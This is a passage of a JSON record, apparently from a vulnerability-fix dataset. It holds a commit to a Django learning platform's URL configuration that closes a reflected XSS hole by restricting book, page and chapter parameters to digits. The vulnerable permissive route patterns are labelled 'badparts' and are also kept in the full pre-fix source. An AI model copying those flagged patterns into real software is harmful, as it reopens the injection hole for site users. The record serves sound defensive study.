url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'),\n        url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'),\n        url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds')\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False):\n    urlpatterns += url(r'^testcenter/login$', 'external_auth.views.test_center_login'),\n\nif settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'):\n    urlpatterns += (\n        url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'),\n        url(r'^gitreload$', 'lms_migration.migrate.gitreload'),\n        url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'):\n    urlpatterns += (\n        url(r'^event_logs$', 'track.views.view_tracking_log'),\n        url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'):\n    urlpatterns += (\n        url(r'^status/', include('service_status.urls')),\n    )\n\nif settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'):\n    urlpatterns += (\n        url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'),\n    )\n\nif settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'):\n    urlpatterns += (\n        url(r'^edinsights_service/', include('edinsights.core.urls')),\n    )\n    import edinsights.core.registry\n\n# FoldIt views\nurlpatterns += (\n    # The path is hardcoded into their app...\n    url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"),\n)\n\nif settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'):\n    urlpatterns += (\n        url(r'^debug/run_python', 'debug.views.run_python'),\n    )\n\n# Crowdsourced hinting instructor manager.\nif settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'):\n    urlpatterns += (\n        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$',\n            'instructor.hint_manager.hint_manager', name=\"hint_manager\"),\n    )\n\nurlpatterns = patterns(*urlpatterns)\n\nif settings.DEBUG:\n    urlpatterns += static(settings.STATIC_URL, document_root=settings.STATIC_ROOT)\n\n#Custom error pages\nhandler404 = 'static_template_view.views.render_404'\nhandler500 = 'static_template_view.views.render_500'\n"
                }
            },
            "msg": "Fix LMS-530, reflected XSS\n\nLimit the page and chapter numbers to digits, to keep malicious URL\ncomponents from being inserted onto the page.\n\nConflicts:\n\tlms/urls.py"
        },
        "5fad9ccca43cdfb565b3f80914f998afa7f2fa78": {
            "url": "https://api.github.com/repos/h4ppyy/m-mooc/commits/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "html_url": "https://github.com/h4ppyy/m-mooc/commit/5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "sha": "5fad9ccca43cdfb565b3f80914f998afa7f2fa78",
            "keyword": "XSS malicious",
            "diff": "diff --git a/lms/urls.py b/lms/urls.py\nindex 51c6ba13b7..b131bb8f0b 100644\n--- a/lms/urls.py\n+++ b/lms/urls.py\n@@ -223,24 +223,24 @@\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
            "message": "",
            "files": {
                "/lms/urls.py": {
                    "changes": [
                        {
                            "diff": "\n             'courseware.views.course_info', name=\"info\"),\n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$',\n             'courseware.views.syllabus', name=\"syllabus\"),   # TODO arjun remove when custom tabs in place, see courseware/courses.py\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',\n             'staticbook.views.index', name=\"book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.index'),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',\n             'staticbook.views.pdf_index', name=\"pdf_book\"),\n \n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n-        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',\n+        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',\n             'staticbook.views.html_index', name=\"html_book\"),\n \n         url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$',\n",
                            "add": 8,
                            "remove": 8,
                            "filename": "/lms/urls.py",
                            "badparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$',"
                            ],
                            "goodparts": [
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/(?P<page>\\d+)$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/$',",
                                "        url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>\\d+)/chapter/(?P<chapter>\\d+)/$',"
                            ]
                        }
                    ],
                    "source": "\nfrom django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views.update_certificate'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$', 'student.views.register_user', name=\"register_user\"), url(r'^admin_dashboard$', 'dashboard.views.dashboard'), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$', 'student.views.accept_name_change'), url(r'^reject_name_change$', 'student.views.reject_name_change'), url(r'^pending_name_changes$', 'student.views.pending_name_changes'), url(r'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$', 'student.views.login_user', name=\"login\"), url(r'^login_ajax/(?P<error>[^/]*)$', 'student.views.login_user'), url(r'^logout$', 'student.views.logout_user', name='logout'), url(r'^create_account$', 'student.views.create_account', name='create_account'), url(r'^activate/(?P<key>[^/]*)$', 'student.views.activate_account', name=\"activate\"), url(r'^begin_exam_registration/(?P<course_id>[^/]+/[^/]+/[^/]+)$', 'student.views.begin_exam_registration', name=\"begin_exam_registration\"), url(r'^create_exam_registration$', 'student.views.create_exam_registration'), url(r'^password_reset/$', 'student.views.password_reset', name='password_reset'), url(r'^password_change/$', django.contrib.auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name='auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^(?i)university_profile/WellesleyX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$', 'static_template_view.views.render', {'template': 'help.html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile'),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?:[^/]+/[^/]+/[^/]+)/wiki/', include(wiki_pattern())), ) if settings.COURSEWARE_ENABLED: urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r'^change_enrollment$', 'student.views.change_enrollment', name=\"change_enrollment\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg/(?P<course_id>.*)$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/?$', 'courseware.views.index', name=\"courseware\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware.views.index', name=\"courseware_section\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/(?P<position>[^/]*)/?$', 'courseware.views.index', name=\"courseware_position\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name=\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_next$', 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading.views.student_problem_list', name='open_ended_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems$', 'open_ended_grading.views.flagged_problem_list', name='open_ended_flagged_problems'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views.debug_cohort_mgmt', name=\"debug_cohort_mgmt\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls')) ) urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views.login_begin', name='openid-login'), url(r'^openid/complete/$', 'external_auth.views.openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid/provider/login/(?:.+)$', 'external_auth.views.provider_identity', name='openid-provider-login-identity'), url(r'^openid/provider/identity/$', 'external_auth.views.provider_identity', name='openid-provider-identity'), url(r'^openid/provider/xrds/$', 'external_auth.views.provider_xrds', name='openid-provider-xrds') ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate/modules$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^migrate/reload/(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/', include('service_status.urls')), ) if settings.MITX_FEATURES.get('ENABLE_INSTRUCTOR_BACKGROUND_TASKS'): urlpatterns +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm/foldit_ops', 'foldit.views.foldit_ops', name=\"foldit_ops\"), ) if settings.MITX_FEATURES.get('ENABLE_DEBUG_RUN_PYTHON'): urlpatterns +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name=\"hint_manager\"), ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500' ",
